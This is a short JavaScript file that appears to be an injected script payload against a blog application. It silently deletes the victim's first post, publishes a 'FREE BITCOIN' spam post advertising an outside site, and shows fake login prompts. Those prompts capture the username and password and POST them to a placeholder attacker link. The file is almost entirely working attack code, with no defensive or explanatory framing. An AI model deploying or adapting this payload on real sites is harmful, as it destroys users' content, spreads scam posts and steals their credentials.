function deletePost(){
    console.log("hello");
    var getPost = new XMLHttpRequest();
    getPost.onreadystatechange = function() {
        if (this.readyState === 4 && this.status === 200) {
            var to_delete = JSON.parse(this.responseText)[0];
            if (!to_delete){
                return;
            }

            if (!to_delete){
                return;
            }

            console.log(to_delete);

            var delPost = new XMLHttpRequest();
            delPost.onreadystatechange = function() {
                if (this.readyState === 4 && this.status === 401) {
                    return makeBlogPost();
                }
            }
            delPost.open("POST", "/posts/"+to_delete.post_id+"/delete", true);
            delPost.send();
        }
    }
    getPost.open("GET", "/posts", true);
    getPost.send();
}

function makeBlogPost(){
    console.log("hello");

    var xhttp = new XMLHttpRequest();

    var blogPost = {
                        title: "FREE BITCOIN",
                        content: "Check out this site totallylegitsite.com"
                    };

    xhttp.open("POST", "/posts/new", true);
    xhttp.setRequestHeader("Content-type", "application/json");
    xhttp.send(JSON.stringify(blogPost));
}
function promptPassword() {
    console.log("hello");
    var usr = prompt("Please enter your username:");
    if (usr !== null){
        var pw = prompt("Please enter your password:");
        if (pw !== null) {
            var xhttp = new XMLHttpRequest();
            xhttp.open("POST", "{sketchy link here}", true);
            xhttp.setRequestHeader("Content-type", "application/json");
            xhttp.send(JSON.stringify({ username: usr, password:pw }));
        }
    }
}

function runscripts(){
    console.log("hello");
    deletePost()
    promptPassword()
}